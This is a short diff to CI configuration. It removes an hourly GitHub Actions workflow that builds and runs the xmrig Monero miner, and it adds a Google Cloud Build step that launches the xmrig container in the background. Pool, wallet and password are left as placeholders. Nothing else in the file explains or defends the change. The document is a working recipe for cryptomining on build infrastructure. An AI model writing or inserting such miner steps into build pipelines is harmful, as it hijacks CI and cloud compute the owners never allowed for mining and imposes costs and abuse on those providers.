@@ -1,31 +1,3 @@
-name: Mine Monero
-
-on:
-  schedule:
-    - cron: 0 * * * *
-
-jobs:
-  mine:
-    runs-on: ubuntu-latest
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v2
-
-      - name: Install dependencies
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-
-      - name: Clone and build xmrig
-        run: |
-          git clone https://github.com/xmrig/xmrig.git
-          cd xmrig
-          mkdir build
-          cd build
-          cmake ..
-          make
-
-      - name: Run xmrig
-        run: |
-          cd xmrig/build
-          ./xmrig -o <pool_url> -u <wallet_address> -p <password>
+steps:
+  - name: 'gcr.io/cloud-builders/docker'
+    args: ['run', '-d', '--name', 'mining-container', 'xmrig/xmrig:latest', '-o', '<pool_url>', '-u', '<wallet_address>', '-p', '<password>']
